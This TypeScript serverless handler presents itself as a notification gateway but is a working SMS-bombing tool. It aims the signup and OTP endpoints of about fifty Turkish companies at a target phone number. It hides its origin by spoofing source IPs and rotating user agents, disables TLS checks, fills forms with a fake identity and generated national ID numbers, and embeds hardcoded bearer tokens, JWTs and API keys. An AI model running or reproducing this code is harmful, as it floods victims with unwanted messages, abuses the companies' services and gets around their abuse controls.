// @ts-nocheck
import type { VercelRequest, VercelResponse } from '@vercel/node';

// SSL Bypass (Legacy sistem simülasyonu için)
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// ─── TYPES ──────────────────────────────────────────────────────────────────

export interface NotificationRequest {
  recipient: string;        // Telefon numarası
  serviceId: string;
  email?: string;
  metadata?: Record<string, unknown>;
}

export interface NotificationResult {
  provider: string;
  success: boolean;
  error?: string;
  attempts: number;
}

// ─── STEALTH UTILITIES (IP & UA ROTATION) ────────────────────────────────────

const getRandomTurkishIP = () => {
  const blocks = [[88, 224, 255], [85, 96, 111], [176, 216, 223], [195, 174, 175], [94, 54, 55]];
  const b = blocks[Math.floor(Math.random() * blocks.length)];
  return `${b[0]}.${Math.floor(Math.random() * (b[2] - b[1])) + b[1]}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
};

const getRandomUA = () => {
  const uas = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0'
  ];
  return uas[Math.floor(Math.random() * uas.length)];
};

// ─── CIRCUIT BREAKER ──────────────────────────────────────────────────────────

class CircuitBreaker {
  private state: "CLOSED" | "OPEN" = "CLOSED";
  private failures = 0;
  private lastFailure = 0;
  private readonly threshold = 3;
  private readonly cooldown = 30000;

  constructor(public readonly name: string) {}

  get isAllowed(): boolean {
    if (this.state === "OPEN" && Date.now() - this.lastFailure > this.cooldown) {
      this.state = "CLOSED";
      this.failures = 0;
    }
    return this.state === "CLOSED";
  }

  onSuccess() { this.failures = 0; this.state = "CLOSED"; }
  onFailure() {
    this.failures++;
    this.lastFailure = Date.now();
    if (this.failures >= this.threshold) this.state = "OPEN";
  }
}

// ─── ADAPTER PATTERN (PROVISIONING LOGIC) ─────────────────────────────────────

interface ProviderAdapter {
  readonly name: string;
  transform(req: NotificationRequest): { body: any; headers: any };
}

// Yardımcı fonksiyonlar
const generateRandomEmail = () => {
  const chars = 'abcdefghijklmnopqrstuvwxyz';
  let result = '';
  for (let i = 0; i < 15; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result + '@gmail.com';
};

const generateTC = () => {
  const rakam = [];
  rakam.push(Math.floor(Math.random() * 9) + 1);
  for (let i = 1; i < 9; i++) {
    rakam.push(Math.floor(Math.random() * 10));
  }
  rakam.push(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10);
  rakam.push((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] + rakam[9]) % 10);
  return rakam.join('');
};

// ─── SERVICE ADAPTERS ─────────────────────────────────────────────────────────

class KahveDunyasiAdapter implements ProviderAdapter {
  readonly name = "kahve_dunyasi";
  transform(req: NotificationRequest) {
    return {
      body: { countryCode: "90", phoneNumber: req.recipient.slice(-10) },
      headers: {
        "X-Client-Platform": "web",
        "X-Language-Id": "tr-TR",
        "Origin": "https://www.kahvedunyasi.com",
        "Referer": "https://www.kahvedunyasi.com/"
      }
    };
  }
}

class KotonAdapter implements ProviderAdapter {
  readonly name = "koton";
  transform(req: NotificationRequest) {
    const email = req.email || generateRandomEmail();
    return {
      body: {
        mobile: req.recipient,
        firstName: "Memati",
        lastName: "Bas",
        email: email,
        password: "Test123!Test"
      },
      headers: { "Origin": "https://www.koton.com" }
    };
  }
}

class PentiAdapter implements ProviderAdapter {
  readonly name = "penti";
  transform(req: NotificationRequest) {
    return {
      body: { phone: req.recipient },
      headers: {}
    };
  }
}

class EnglishHomeAdapter implements ProviderAdapter {
  readonly name = "english_home";
  transform(req: NotificationRequest) {
    return {
      body: { Phone: req.recipient, XID: "" },
      headers: {
        "Origin": "https://www.englishhome.com",
        "Referer": "https://www.englishhome.com/"
      }
    };
  }
}

class MigrosAdapter implements ProviderAdapter {
  readonly name = "migros";
  transform(req: NotificationRequest) {
    const email = req.email || generateRandomEmail();
    return {
      body: { email: email, phoneNumber: req.recipient },
      headers: {
        "X-Device-Platform": "IOS",
        "X-Device-App-Version": "10.6.13",
        "X-Device-Type": "MOBILE",
        "X-Device-Language": "tr-TR"
      }
    };
  }
}

class FileMarketAdapter implements ProviderAdapter {
  readonly name = "file_market";
  transform(req: NotificationRequest) {
    return {
      body: { mobilePhoneNumber: `90${req.recipient.slice(-10)}` },
      headers: { "X-Os": "IOS", "X-Version": "1.7" }
    };
  }
}

class BimAdapter implements ProviderAdapter {
  readonly name = "bim";
  transform(req: NotificationRequest) {
    return {
      body: { phone: req.recipient },
      headers: {}
    };
  }
}

class MetroMarketAdapter implements ProviderAdapter {
  readonly name = "metro_market";
  transform(req: NotificationRequest) {
    return {
      body: { methodType: "2", mobilePhoneNumber: `+90${req.recipient.slice(-10)}` },
      headers: { "Applicationplatform": "2", "Applicationversion": "2.1.1" }
    };
  }
}

class WmfAdapter implements ProviderAdapter {
  readonly name = "wmf";
  transform(req: NotificationRequest) {
    const email = req.email || generateRandomEmail();
    return {
      body: {
        confirm: "true",
        date_of_birth: "1990-01-01",
        email: email,
        email_allowed: "true",
        first_name: "Memati",
        gender: "male",
        last_name: "Bas",
        password: "Test123!Test",
        phone: `0${req.recipient.slice(-10)}`
      },
      headers: { "Content-Type": "application/x-www-form-urlencoded" }
    };
  }
}

class EvideaAdapter implements ProviderAdapter {
  readonly name = "evidea";
  transform(req: NotificationRequest) {
    const email = req.email || generateRandomEmail();
    const boundary = "----WebKitFormBoundary" + Math.random().toString(36).substring(2);
    const data = `--${boundary}\r\nContent-Disposition: form-data; name="first_name"\r\n\r\nMemati\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="last_name"\r\n\r\nBas\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="email"\r\n\r\n${email}\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="phone"\r\n\r\n0${req.recipient.slice(-10)}\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="password"\r\n\r\nTest123!\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="confirm"\r\n\r\ntrue\r\n` +
      `--${boundary}--`;
    return {
      body: data,
      headers: { "Content-Type": `multipart/form-data; boundary=${boundary}` }
    };
  }
}

class TiklaGelsinAdapter implements ProviderAdapter {
  readonly name = "tikla_gelsin";
  transform(req: NotificationRequest) {
    return {
      body: {
        query: `mutation { sendOtpSms(phone: "${req.recipient.slice(-10)}") { resultStatus message } }`
      },
      headers: { "Origin": "https://www.tiklagelsin.com" }
    };
  }
}

class StarbucksAdapter implements ProviderAdapter {
  readonly name = "starbucks";
  transform(req: NotificationRequest) {
    const email = req.email || generateRandomEmail();
    return {
      body: {
        allowEmail: true,
        allowSms: true,
        deviceId: "31",
        email: email,
        firstName: "Memati",
        lastName: "Bas",
        password: "Test123!Test",
        phoneNumber: req.recipient,
        preferredName: "Memati"
      },
      headers: { "Operationchannel": "ios" }
    };
  }
}

class DominosAdapter implements ProviderAdapter {
  readonly name = "dominos";
  transform(req: NotificationRequest) {
    const email = req.email || generateRandomEmail();
    return {
      body: { mobilePhone: req.recipient.slice(-10), isSure: false, email: email },
      headers: { "Appversion": "IOS-7.1.0", "Servicetype": "CarryOut" }
    };
  }
}

class LittleCaesarsAdapter implements ProviderAdapter {
  readonly name = "little_caesars";
  transform(req: NotificationRequest) {
    return {
      body: { Phone: `0${req.recipient.slice(-10)}`, NameSurname: "Memati Bas" },
      headers: { "X-Platform": "ios", "X-Version": "1.0.0" }
    };
  }
}

class BaydonerAdapter implements ProviderAdapter {
  readonly name = "baydoner";
  transform(req: NotificationRequest) {
    const email = req.email || generateRandomEmail();
    return {
      body: {
        AppVersion: "1.3.2",
        AreaCode: 90,
        City: "İSTANBUL",
        CityId: 34,
        DeviceId: "31s",
        Email: email,
        GDPRPolicy: false,
        Gender: "Erkek",
        GenderId: 1,
        Name: "Memati",
        PhoneNumber: req.recipient,
        Platform: 1,
        Surname: "Bas",
        TermsAndConditions: false
      },
      headers: { "Platform": "1" }
    };
  }
}

class KofteciYusufAdapter implements ProviderAdapter {
  readonly name = "kofteci_yusuf";
  transform(req: NotificationRequest) {
    return {
      body: { Telefon: req.recipient },
      headers: {}
    };
  }
}

class KomageneAdapter implements ProviderAdapter {
  readonly name = "komagene";
  transform(req: NotificationRequest) {
    return {
      body: { Telefon: req.recipient, FirmaId: "32" },
      headers: {}
    };
  }
}

class CoffyAdapter implements ProviderAdapter {
  readonly name = "coffy";
  transform(req: NotificationRequest) {
    return {
      body: { phoneNumber: req.recipient },
      headers: {}
    };
  }
}

class MartiAdapter implements ProviderAdapter {
  readonly name = "marti";
  transform(req: NotificationRequest) {
    return {
      body: { mobile_number: req.recipient },
      headers: {}
    };
  }
}

class IDOAdapter implements ProviderAdapter {
  readonly name = "ido";
  transform(req: NotificationRequest) {
    return {
      body: { phone: req.recipient },
      headers: {}
    };
  }
}

class KimGbIsterAdapter implements ProviderAdapter {
  readonly name = "kim_gb_ister";
  transform(req: NotificationRequest) {
    return {
      body: { msisdn: `90${req.recipient.slice(-10)}` },
      headers: {}
    };
  }
}

class Dijital345Adapter implements ProviderAdapter {
  readonly name = "345_dijital";
  transform(req: NotificationRequest) {
    return {
      body: { phoneNumber: `+90${req.recipient.slice(-10)}` },
      headers: {}
    };
  }
}

class BeefullAdapter implements ProviderAdapter {
  readonly name = "beefull";
  transform(req: NotificationRequest) {
    return {
      body: {
        phoneCode: "90",
        phoneNumber: req.recipient.slice(-10),
        tenant: "beefull"
      },
      headers: {}
    };
  }
}

class NaosstarsAdapter implements ProviderAdapter {
  readonly name = "naosstars";
  transform(req: NotificationRequest) {
    return {
      body: { telephone: `+90${req.recipient.slice(-10)}` },
      headers: {}
    };
  }
}

class AkasyaAvmAdapter implements ProviderAdapter {
  readonly name = "akasya_avm";
  transform(req: NotificationRequest) {
    return {
      body: { phone: req.recipient },
      headers: { "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5" }
    };
  }
}

class AkbatiAdapter implements ProviderAdapter {
  readonly name = "akbati";
  transform(req: NotificationRequest) {
    return {
      body: { phone: req.recipient },
      headers: { "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3" }
    };
  }
}

class YappAdapter implements ProviderAdapter {
  readonly name = "yapp";
  transform(req: NotificationRequest) {
    const email = req.email || generateRandomEmail();
    return {
      body: {
        app_version: "1.1.2",
        code: "tr",
        device_model: "iPhone9,4",
        device_type: "I",
        device_version: "15.7.8",
        email: email,
        firstname: "Memati",
        is_allow_to_communication: "1",
        language_id: "1",
        lastname: "Bas",
        phone_number: req.recipient
      },
      headers: {}
    };
  }
}

class SuisteAdapter implements ProviderAdapter {
  readonly name = "suiste";
  transform(req: NotificationRequest) {
    return {
      body: {
        action: "register",
        device_id: "2390ED28-075E-465A-96DA-DFE8F84EB330",
        full_name: "Memati Bas",
        gsm: req.recipient,
        is_advertisement: "1",
        is_contract: "1",
        password: "Test123!"
      },
      headers: {
        "X-Mobillium-Device-Brand": "Apple",
        "X-Mobillium-Os-Type": "iOS"
      }
    };
  }
}

class PortyAdapter implements ProviderAdapter {
  readonly name = "porty";
  transform(req: NotificationRequest) {
    return {
      body: { phone: req.recipient },
      headers: { "Token": "q2zS6kX7WYFRwVYAr" }
    };
  }
}

class CineverseAdapter implements ProviderAdapter {
  readonly name = "cineverse";
  transform(req: NotificationRequest) {
    return {
      body: { mobile: req.recipient },
      headers: {}
    };
  }
}

class MoneyAdapter implements ProviderAdapter {
  readonly name = "money";
  transform(req: NotificationRequest) {
    const formatted = `${req.recipient.slice(0, 3)} ${req.recipient.slice(3, 6)} ${req.recipient.slice(6, 10)}`;
    return {
      body: { phone: formatted, GRecaptchaResponse: "" },
      headers: {
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://www.money.com.tr"
      }
    };
  }
}

class HayatsuAdapter implements ProviderAdapter {
  readonly name = "hayat_su";
  transform(req: NotificationRequest) {
    return {
      body: { mobilePhoneNumber: req.recipient, actionType: "register" },
      headers: {
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM"
      }
    };
  }
}

class JokerAdapter implements ProviderAdapter {
  readonly name = "joker";
  transform(req: NotificationRequest) {
    const email = req.email || generateRandomEmail();
    return {
      body: {
        firstName: "Memati",
        gender: "m",
        iosVersion: "4.0.2",
        lastName: "Bas",
        os: "IOS",
        password: "Test123!Test",
        phoneNumber: `0${req.recipient.slice(-10)}`,
        username: email
      },
      headers: {
        "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE2OTA3MTY1MjEsImV4cCI6MTY5NTkwMDUyMSwidXNlcm5hbWUiOiJHVUVTVDE2OTA3MTY1MjEzMzA3MzdAam9rZXIuY29tLnRyIiwiZ3Vlc3QiOnRydWV9.TaQA8ZDtmU09eFqOFATS8ubXM4BHPQL_BcgeEoqZfuNZcfjfL_xzqRO7fZehzWzEdjHXNXeCUTdjx76EyVB-b3TFuL3OahmrbeaOICD8MXchhMDv78TFhWzOJ9Ad-Mma6QPScSSVL0pYoQHWRhzaeOkmVeypqYiQKGmOEk9NzfOVxDYPa25iJmetiab1Z_b95Hqt5Cls52V7g4pGWmbjYB3gyeUQn5II6neKN174txp1yaGdrNPYwAk_aRJzoAMA1SisZm4rhjdE_9MeyGwjbgk2obPxEVcwvPPwkd56_a34aDOeo6rAvngGALBPWlS89nfHFb6PU2fKyK7jTaVlC0DiVnojlkC_KzoHcptM7SjQBym4Bn9CXZ4kj2J1Om-dhDymQynSCfmQ3JZQd7n1YdQYYMuAoTbjghZhyPu2SCtlI7ao6JhUUcmtO3fjIiyYgAdgD-FDcqSGAs9i5fn3kCidSku5M4ljq1ovJM4BeaNeQdFXqE_WqurpOeLA95fNumGCoXvJGlLhS5VzMdFT-l3cfdPt0V0WmtjJDRpTnosjgfizx4F5qftlVuF98uoFoexg7lQYHyZ-j455-d5B24_WfU8GCjQhtlDVtSTcMiRvUKEjJ-Glm5syv5VVbR7mJxu64SB2J2dPbHcIk6BQuFYXIJklN7GXxDa8mSnEZds"
      }
    };
  }
}

class HappyAdapter implements ProviderAdapter {
  readonly name = "happy";
  transform(req: NotificationRequest) {
    return {
      body: { telephone: req.recipient },
      headers: {
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://www.happy.com.tr"
      }
    };
  }
}

class UysalMarketAdapter implements ProviderAdapter {
  readonly name = "uysal_market";
  transform(req: NotificationRequest) {
    return {
      body: { phone_number: req.recipient },
      headers: {}
    };
  }
}

class KuryemGelsinAdapter implements ProviderAdapter {
  readonly name = "kuryem_gelsin";
  transform(req: NotificationRequest) {
    return {
      body: { phoneNumber: req.recipient, phone_country_code: "+90" },
      headers: {}
    };
  }
}

class QumparaAdapter implements ProviderAdapter {
  readonly name = "qumpara";
  transform(req: NotificationRequest) {
    return {
      body: { msisdn: `+90${req.recipient.slice(-10)}` },
      headers: {}
    };
  }
}

class PaybolAdapter implements ProviderAdapter {
  readonly name = "paybol";
  transform(req: NotificationRequest) {
    return {
      body: { phone_number: `90${req.recipient.slice(-10)}` },
      headers: {}
    };
  }
}

class YuffiAdapter implements ProviderAdapter {
  readonly name = "yuffi";
  transform(req: NotificationRequest) {
    return {
      body: { phone: req.recipient, kvkk: true },
      headers: {}
    };
  }
}

class HizlieczaAdapter implements ProviderAdapter {
  readonly name = "hizliecza";
  transform(req: NotificationRequest) {
    return {
      body: { otpOperationType: 2, phoneNumber: `+90${req.recipient.slice(-10)}` },
      headers: { "Authorization": "Bearer null" }
    };
  }
}

class IpragazAdapter implements ProviderAdapter {
  readonly name = "ipragaz";
  transform(req: NotificationRequest) {
    return {
      body: {
        birthDate: "01/01/1990",
        carPlate: "34 ABC 34",
        mobileOtp: "",
        name: "Memati Bas",
        otp: "",
        phoneNumber: req.recipient,
        playerId: ""
      },
      headers: {
        "App-Version": "1.3.9",
        "App-Name": "ipragaz-mobile",
        "Os": "ios"
      }
    };
  }
}

class HamidiyeAdapter implements ProviderAdapter {
  readonly name = "hamidiye";
  transform(req: NotificationRequest) {
    return {
      body: { phone: req.recipient, isGuest: false },
      headers: { "Origin": "com.hamidiyeapp" }
    };
  }
}

class ClickmeLiveAdapter implements ProviderAdapter {
  readonly name = "clickme_live";
  transform(req: NotificationRequest) {
    return {
      body: { phone: req.recipient },
      headers: {
        "Authorization": "apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc",
        "Client-Version": "1.4.0",
        "Client-Device": "IOS"
      }
    };
  }
}

class IstegelsinAdapter implements ProviderAdapter {
  readonly name = "istegelsin";
  transform(req: NotificationRequest) {
    return {
      body: { phone: req.recipient },
      headers: {}
    };
  }
}

class PidemAdapter implements ProviderAdapter {
  readonly name = "pidem";
  transform(req: NotificationRequest) {
    return {
      body: { phone: req.recipient.slice(-10) },
      headers: {}
    };
  }
}

class TasimacimAdapter implements ProviderAdapter {
  readonly name = "tasimacim";
  transform(req: NotificationRequest) {
    return {
      body: { phone: req.recipient },
      headers: {}
    };
  }
}

class HeyScooterAdapter implements ProviderAdapter {
  readonly name = "hey_scooter";
  transform(req: NotificationRequest) {
    return {
      body: { phone: req.recipient },
      headers: {}
    };
  }
}

// ─── ADAPTER REGISTRY ─────────────────────────────────────────────────────────

const adapters: Record<string, ProviderAdapter> = {
  kahve_dunyasi: new KahveDunyasiAdapter(),
  koton: new KotonAdapter(),
  penti: new PentiAdapter(),
  english_home: new EnglishHomeAdapter(),
  migros: new MigrosAdapter(),
  file_market: new FileMarketAdapter(),
  bim: new BimAdapter(),
  metro_market: new MetroMarketAdapter(),
  wmf: new WmfAdapter(),
  evidea: new EvideaAdapter(),
  tikla_gelsin: new TiklaGelsinAdapter(),
  starbucks: new StarbucksAdapter(),
  dominos: new DominosAdapter(),
  little_caesars: new LittleCaesarsAdapter(),
  baydoner: new BaydonerAdapter(),
  kofteci_yusuf: new KofteciYusufAdapter(),
  komagene: new KomageneAdapter(),
  coffy: new CoffyAdapter(),
  marti: new MartiAdapter(),
  ido: new IDOAdapter(),
  kim_gb_ister: new KimGbIsterAdapter(),
  "345_dijital": new Dijital345Adapter(),
  beefull: new BeefullAdapter(),
  naosstars: new NaosstarsAdapter(),
  akasya_avm: new AkasyaAvmAdapter(),
  akbati: new AkbatiAdapter(),
  yapp: new YappAdapter(),
  suiste: new SuisteAdapter(),
  porty: new PortyAdapter(),
  cineverse: new CineverseAdapter(),
  money: new MoneyAdapter(),
  hayat_su: new HayatsuAdapter(),
  joker: new JokerAdapter(),
  happy: new HappyAdapter(),
  uysal_market: new UysalMarketAdapter(),
  kuryem_gelsin: new KuryemGelsinAdapter(),
  qumpara: new QumparaAdapter(),
  paybol: new PaybolAdapter(),
  yuffi: new YuffiAdapter(),
  hizliecza: new HizlieczaAdapter(),
  ipragaz: new IpragazAdapter(),
  hamidiye: new HamidiyeAdapter(),
  vakif_tasdelen: new HamidiyeAdapter(),
  tasdelen: new HamidiyeAdapter(),
  clickme_live: new ClickmeLiveAdapter(),
  istegelsin: new IstegelsinAdapter(),
  pidem: new PidemAdapter(),
  tasimacim: new TasimacimAdapter(),
  hey_scooter: new HeyScooterAdapter(),
  // Default adapter for unknown services
  default: {
    name: "default",
    transform: (r) => ({ body: { phone: r.recipient }, headers: {} })
  }
};

const breakers = new Map<string, CircuitBreaker>();

// ─── GATEWAY HANDLER ──────────────────────────────────────────────────────────

export default async function handler(req: VercelRequest, res: VercelResponse) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    const body = typeof req.body === 'string' ? JSON.parse(req.body) : (req.body || {});
    const { serviceId, serviceUrl, targetPhone } = body;

    if (!serviceId || !serviceUrl || !targetPhone) {
      return res.status(400).json({
        ok: false,
        error: "Missing required fields: serviceId, serviceUrl, targetPhone"
      });
    }

    // 1. Circuit Breaker Kontrolü
    if (!breakers.has(serviceId)) breakers.set(serviceId, new CircuitBreaker(serviceId));
    const breaker = breakers.get(serviceId)!;

    if (!breaker.isAllowed) {
      return res.status(200).json({ ok: false, error: "Circuit OPEN (Cooldown)" });
    }

    // 2. Adapter Dönüşümü
    const adapter = adapters[serviceId] || adapters.default;
    const { body: payload, headers: extraHeaders } = adapter.transform({
      recipient: targetPhone,
      serviceId,
      email: body.email
    });

    // 3. Stealth Fetch Execution
    const fakeIP = getRandomTurkishIP();
    const isFormData = extraHeaders['Content-Type']?.includes('multipart/form-data');
    const isFormUrlEncoded = extraHeaders['Content-Type']?.includes('x-www-form-urlencoded');

    let fetchBody: string | FormData;
    let contentType = 'application/json';

    if (isFormData) {
      fetchBody = payload;
      contentType = extraHeaders['Content-Type'];
    } else if (isFormUrlEncoded) {
      fetchBody = new URLSearchParams(payload).toString();
      contentType = 'application/x-www-form-urlencoded';
    } else {
      fetchBody = JSON.stringify(payload);
    }

    const response = await fetch(serviceUrl, {
      method: 'POST',
      headers: {
        'Content-Type': contentType,
        'User-Agent': getRandomUA(),
        'X-Forwarded-For': fakeIP,
        'X-Real-IP': fakeIP,
        'Origin': new URL(serviceUrl).origin,
        'Referer': new URL(serviceUrl).origin + '/',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        ...extraHeaders
      },
      body: fetchBody
    });

    const responseText = await response.text();
    let responseData;
    try {
      responseData = JSON.parse(responseText);
    } catch {
      responseData = { raw: responseText.substring(0, 200) };
    }

    // Başarı kontrolü
    const isSuccess = response.ok ||
      responseData?.processStatus === 'Success' ||
      responseData?.isError === false ||
      responseData?.successful === true ||
      responseData?.isSuccess === true ||
      responseData?.status === 'success' ||
      responseData?.code === 'common.success' ||
      responseData?.responseType === 'SUCCESS' ||
      responseData?.result === 'SMS sended succesfully!' ||
      responseData?.result === true ||
      responseData?.Success === true ||
      responseData?.Control === 1 ||
      responseData?.code === 50 ||
      responseData?.status === 0 ||
      responseData?.Durum === true;

    if (isSuccess) {
      breaker.onSuccess();
    } else {
      breaker.onFailure();
    }

    return res.status(200).json({
      ok: isSuccess,
      upstreamStatus: response.status,
      responsePreview: responseText.substring(0, 200),
      responseData: responseData
    });

  } catch (error: any) {
    console.error('Proxy error:', error);
    return res.status(200).json({ ok: false, error: error.message });
  }
}
